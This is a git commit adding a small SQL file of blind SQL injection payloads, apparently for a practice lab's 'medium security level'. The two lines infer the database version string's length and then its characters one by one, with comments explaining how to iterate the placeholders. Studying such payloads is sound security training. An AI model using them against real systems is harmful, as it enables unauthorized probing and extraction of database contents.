4a26c60821f6f716cf5dc5d0e7f65d3e2e0d4dbb
Wiktoria Blomgren Strandberg <102546496+wikblo-0@users.noreply.github.com>
2026-04-25 22:07:45 +0200

    Fix SQL payload syntax for version length check

---
+++ medium_security_level.sql
@@ -0,0 +1,8 @@
+/* SQL payload for revealing the length of the database server version string.
+  "NUMBER" is meant to be replaced with increasing integer values between 1 and 50 until the query returns true. */
+1 and length(@@version)=NUMBER#
+
+/* SQL payload for revealing the character at a certain position of the database server version string.
+  "POSITION" is meant to be replaced with increasing integer values between 1 and the string length until all characters in the string has been found.
+  "CHARACTER" is meant to be replaced with an ASCII character code between 32 and 126 until the query returns true. */
+1 AND ASCII(SUBSTRING(@@version,POSITION,1))=CHARACTER#
